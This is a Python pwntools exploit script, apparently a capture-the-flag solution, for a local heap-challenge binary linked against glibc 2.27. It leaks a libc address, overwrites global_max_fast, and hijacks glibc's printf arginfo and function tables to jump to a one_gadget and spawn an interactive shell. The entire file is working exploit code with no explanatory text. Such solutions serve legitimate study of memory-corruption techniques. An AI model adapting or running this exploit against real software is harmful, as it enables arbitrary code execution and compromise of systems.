from pwn import *

p = process("./sft")
context.log_level='debug'

def log(addr):
    print("[*]==>"+hex(addr))

def offset(num):
    return num*2


libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6')
arginfo = 4114544 # __printf_arginfo_table
function = 4130392 # __printf_function_table

main_arena = libc.sym['__malloc_hook']-0x10 
size_1 = offset(arginfo - main_arena)-0x50
size_2 = offset(function - main_arena)-0x50
log(size_1)
log(size_2)
# gdb.attach(p)
p.sendlineafter("big box, what size?",str(size_1))
p.sendlineafter("bigger box, what size?",str(size_2))
p.sendlineafter(" rename?(y/n)","y")
p.recvuntil("Now your name is:")
addr = u64(p.recvuntil('\x7f').ljust(8,"\x00"))
log(addr)
libc_base = addr-libc.sym['__malloc_hook']-0x10-96
log(libc_base)
global_max_fast = libc_base + 4118848
ogg = [0x4f365 ,0x4f3c2 ,0x10a45c]
one_gadget = libc_base +ogg[2]
log(one_gadget)

payload = "a"*8*(ord('s')-2) + p64(one_gadget)*2
gdb.attach(p)
p.sendlineafter("please input your new name!",p64(0)+p64(global_max_fast-0x10))
p.sendlineafter(" box or bigger box?(1:big/2:bigger)",str(1))
# gdb.attach(p)
p.sendlineafter("Let's edit,",payload)
pause()
p.interactive()